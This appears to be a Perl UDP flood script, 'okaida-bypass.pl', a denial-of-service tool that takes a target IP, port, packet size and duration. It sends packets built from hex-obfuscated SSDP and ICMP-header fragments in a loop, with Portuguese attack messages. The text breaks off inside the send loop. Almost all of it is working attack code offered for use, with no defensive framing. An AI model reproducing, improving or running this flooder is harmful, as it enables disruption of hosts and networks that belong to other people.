use Socket;
use strict;

if ($#ARGV != 3) {
print "
 _______ __           __     __               __                                       ______    ______
|       |  |--.---.-.|__|.--|  |.---.-.______|  |--.--.--.-----.---.-.-----.-----.    |__    |  |      |
|   -   |    <|  _  ||  ||  _  ||  _  |______|  _  |  |  |  _  |  _  |__ --|__ --|    |__    |__|  --  |
|_______|__|__|___._||__||_____||___._|      |_____|___  |   __|___._|_____|_____|    |______|__|______|
                                                   |_____|__|

[?] <okaida-bypass.pl> <addr> <dport> <psize> <tempo>
";
exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
        my @hex =("\x4d", "\x2d", "\x53", "\x45", "\x41", "\x52", "\x43", "\x48", "\x20", "\x2a", "\x20", "\x48", "\x54", "\x54", "\x50", "\x2f", "\x31", "\x2e", "\x31", "\x0d", "\x0a", "\x48", "\x4f", "\x53", "\x54", "\x3a", "\x20", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x3a", "\x31", "\x39", "\x30", "\x30", "\x0d", "\x0a", "\x4d", "\x41", "\x4e", "\x3a", "\x20", "\x22", "\x73", "\x73", "\x64", "\x70", "\x3a", "\x64", "\x69", "\x73", "\x63", "\x6f", "\x76", "\x65", "\x72", "\x22", "\x0d", "\x0a", "\x4d", "\x58", "\x3a", "\x20", "\x31", "\x0d", "\x0a", "\x53", "\x54", "\x3a", "\x20", "\x75", "\x72", "\x6e","\x3a", "\x64", "\x69", "\x61", "\x6c", "\x2d", "\x6d", "\x75", "\x6c", "\x74", "\x69", "\x73", "\x63", "\x72", "\x65", "\x65", "\x6e", "\x2d", "\x6f", "\x72", "\x67", "\x3a", "\x73", "\x65", "\x72", "\x76", "\x69", "\x63", "\x65", "\x3a", "\x64", "\x69", "\x61", "\x6c", "\x3a", "\x31", "\x0d", "\x0a", "\x55", "\x53", "\x45", "\x52", "\x2d", "\x41", "\x47", "\x45", "\x4e", "\x54", "\x3a", "\x20", "\x47", "\x6f", "\x6f", "\x67", "\x6c", "\x65", "\x20", "\x43", "\x68", "\x72", "\x6f", "\x6d", "\x65", "\x2f", "\x36", "\x30", "\x2e", "\x30", "\x2e", "\x33", "\x31", "\x31", "\x32", "\x2e", "\x39", "\x30", "\x20", "\x57", "\x69", "\x6e", "\x64", "\x6f", "\x77", "\x73", "\x0d", "\x0a", "\x0d", "\x0a");
        my @hex2 =("\x49","\x6E","\x74","\x65","\x72","\x6E","\x65","\x74","\x20","\x50","\x72","\x6F","\x74","\x6F","\x63","\x6F","\x6C","\x20","\x56","\x65","\x72","\x73","\x69","\x6F","\x6E","\x20","\x34","\x2C","\x20","\x53","\x72","\x63","\x3A","\x20","\x31","\x2E","\x31","\x2E","\x31","\x2E","\x31","\x2C","\x20","\x44","\x73","\x74","\x3A","\x20","\x31","\x39","\x32","\x2E","\x31","\x36","\x38","\x2E","\x31","\x30","\x30","\x2E","\x31","\x32","\x0A","\x20","\x20","\x20","\x20","\x30","\x31","\x30","\x30","\x20","\x2E","\x2E","\x2E","\x2E","\x20","\x3D","\x20","\x56","\x65","\x72","\x73","\x69","\x6F","\x6E","\x3A","\x20","\x34","\x0A","\x20","\x20","\x20","\x20","\x2E","\x2E","\x2E","\x2E","\x20","\x30","\x31","\x30","\x31","\x20","\x3D","\x20","\x48","\x65","\x61","\x64","\x65","\x72","\x20","\x4C","\x65","\x6E","\x67","\x74","\x68","\x3A","\x20","\x32","\x30","\x20","\x62","\x79","\x74","\x65","\x73","\x20","\x28","\x35","\x29","\x0A","\x20","\x20","\x20","\x20","\x44","\x69","\x66","\x66","\x65","\x72","\x65","\x6E","\x74","\x69","\x61","\x74","\x65","\x64","\x20","\x53","\x65","\x72","\x76","\x69","\x63","\x65","\x73","\x20","\x46","\x69","\x65","\x6C","\x64","\x3A","\x20","\x30","\x78","\x30","\x30","\x20","\x28","\x44","\x53","\x43","\x50","\x3A","\x20","\x43","\x53","\x30","\x2C","\x20","\x45","\x43","\x4E","\x3A","\x20","\x4E","\x6F","\x74","\x2D","\x45","\x43","\x54","\x29","\x0A","\x20","\x20","\x20","\x20","\x54","\x6F","\x74","\x61","\x6C","\x20","\x4C","\x65","\x6E","\x67","\x74","\x68","\x3A","\x20","\x36","\x30","\x0A","\x20","\x20","\x20","\x20","\x49","\x64","\x65","\x6E","\x74","\x69","\x66","\x69","\x63","\x61","\x74","\x69","\x6F","\x6E","\x3A","\x20","\x30","\x78","\x39","\x36","\x64","\x65","\x20","\x28","\x33","\x38","\x36","\x32","\x32","\x29","\x0A","\x20","\x20","\x20","\x20","\x46","\x6C","\x61","\x67","\x73","\x3A","\x20","\x30","\x78","\x30","\x30","\x30","\x30","\x0A","\x20","\x20","\x20","\x20","\x54","\x69","\x6D","\x65","\x20","\x74","\x6F","\x20","\x6C","\x69","\x76","\x65","\x3A","\x20","\x35","\x37","\x0A","\x20","\x20","\x20","\x20","\x50","\x72","\x6F","\x74","\x6F","\x63","\x6F","\x6C","\x3A","\x20","\x49","\x43","\x4D","\x50","\x20","\x28","\x31","\x29","\x0A","\x20","\x20","\x20","\x20","\x48","\x65","\x61","\x64","\x65","\x72","\x20","\x63","\x68","\x65","\x63","\x6B","\x73","\x75","\x6D","\x3A","\x20","\x30","\x78","\x63","\x34","\x32","\x63","\x20","\x5B","\x76","\x61","\x6C","\x69","\x64","\x61","\x74","\x69","\x6F","\x6E","\x20","\x64","\x69","\x73","\x61","\x62","\x6C","\x65","\x64","\x5D","\x0A","\x20","\x20","\x20","\x20","\x5B","\x48","\x65","\x61","\x64","\x65","\x72","\x20","\x63","\x68","\x65","\x63","\x6B","\x73","\x75","\x6D","\x20","\x73","\x74","\x61","\x74","\x75","\x73","\x3A","\x20","\x55","\x6E","\x76","\x65","\x72","\x69","\x66","\x69","\x65","\x64","\x5D","\x0A","\x20","\x20","\x20","\x20","\x53","\x6F","\x75","\x72","\x63","\x65","\x3A","\x20","\x31","\x2E","\x31","\x2E","\x31","\x2E","\x31","\x0A","\x20","\x20","\x20","\x20","\x44","\x65","\x73","\x74","\x69","\x6E","\x61","\x74","\x69","\x6F","\x6E","\x3A","\x20","\x31","\x39","\x32","\x2E","\x31","\x36","\x38","\x2E","\x30","\x2E","\x31","\x0A","\x49","\x6E","\x74","\x65","\x72","\x6E","\x65","\x74","\x20","\x43","\x6F","\x6E","\x74","\x72","\x6F","\x6C","\x20","\x4D","\x65","\x73","\x73","\x61","\x67","\x65","\x20","\x50","\x72","\x6F","\x74","\x6F","\x63","\x6F","\x6C");

                $iaddr = inet_aton("$ip") or die "Erro!\n";
                $endtime = time() + ($time ? $time : 1000000);

        socket(flood, PF_INET, SOCK_DGRAM, 17);

print"
[!] Atacando $ip, na porta $port, por $time segundos.
";

        for (; time() <= $endtime;) {

                $psize = $size ? $size : int(rand(1500 - 64) + 64);
                $pport = $port ? $port : int(rand(65500)) + 1;

        send(flood, $hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "\x00" .$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
